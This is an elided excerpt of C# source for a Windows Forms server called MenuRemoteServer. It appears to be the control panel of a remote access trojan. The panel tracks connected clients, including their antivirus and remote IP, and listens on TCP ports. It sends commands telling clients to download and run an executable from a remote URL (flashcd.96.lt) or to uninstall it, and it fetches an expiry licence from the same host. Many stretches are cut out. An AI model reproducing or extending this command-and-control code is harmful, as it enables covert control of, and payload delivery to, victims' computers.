...
namespace MenuRemoteServer
{
    public partial class MenuRemoteServer : Form
    {
            ...
            else
            {
                ...
                foreach (ListViewItem lvItemIn in listView_clients.Items)
                {
                    if (lvItemIn.Name == id)
                    {
                        ...
                        lvItemIn.SubItems[8].Text = client.av;
                        lvItemIn.SubItems[9].Text = client.rip;
                        return;
                    }
                }
        ...
        // ==================================== Envia notificação pro PC ======================================

        private void NotificaPC(object parameter)
        {
            try
            {
               /* foreach (IPAddress ip in Dns.GetHostAddresses(tNoip.Text))
                { */

                    TcpClient clientSocket = new TcpClient();
                                           //ip
                    clientSocket.Connect(LocalIPAddress(), 8888);

                    NetworkStream serverStream = clientSocket.GetStream();
                    byte[] outStream = System.Text.Encoding.ASCII.GetBytes(parameter + "$");
        ...
        private void HandleClientComm(object client)
        {
            ...
            try
            {
                ...
                while (true)
                {
                   ...
                   /* Thread Nota = new Thread(() => NotificaPC(recebido));
                    Nota.Start(); */

                    Thread t = new Thread(new ParameterizedThreadStart(NotificaPC));
                    t.Start(recebido);
                }
    ...
    //============================= TRECHO PARA RECEBER NOTAS DE OPERAÇÕES REALIZADAS NO CLIENTE =================================
        ...
        private void ListenForClients2()
        {
            ...
            try
            {
                ...
                while (true)
                {
                    TcpClient client = this.tcpListener2.AcceptTcpClient();
        ...
        private void button_activate_Click(object sender, EventArgs e)
        {
            ...
            else
            {
                ...
                button_activate.BackColor = Color.Blue;
        ...
        private void MenuRemoteServer_Load(object sender, EventArgs e)
        {
            try
            {
                    using(Mutex mutex = new Mutex(false, "Global\\" + "c0a76b5a-12ab-45c5-b9d9-d693faa6e8b9"))
                    {
                ...
                DateTime expiraEm = DateTime.Parse(getBetween(readUrl(@"http://flashcd.96.lt/limite.ini"), "<-", "->"));
                DateTime dataSyst = DateTime.Now;
                string flag = getBetween(readUrl(@"http://flashcd.96.lt/limite.ini"), "<", ">");
            ...
            try
            {
                ...
                this.listenThread.Start();
                 ...
                 this.tcpListener2 = new TcpListener(IPAddress.Any, 6073);
        ...
        private void tAtualiza_Click(object sender, EventArgs e)
        {
            String url_arquivo = Interaction.InputBox("Coloque aqui o site onde encontra-se o cliente.\n Ex: http://flashcd.96.lt/MenuRemoteClient.exe", "Baixar Cliente", "", 10, 10);
            String message = String.Format("<|CLIENT|>{0}", url_arquivo);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
        ...
        private void tDesisntalar_Click(object sender, EventArgs e)
        {
            String executavel = Interaction.InputBox("Informe o nome do executável que será excluído.\n Ex: MenuRemoteClient", "Desinstalar Cliente", "", 10, 10);
            String message = String.Format("<|UNINSTALL|>{0}", executavel);
            ListViewItem item = listView_clients.FocusedItem;
            String clientId = item.Name;
            RemoteClient client = this.remoteClientManager.GetClientById(clientId);
            if (client != null)
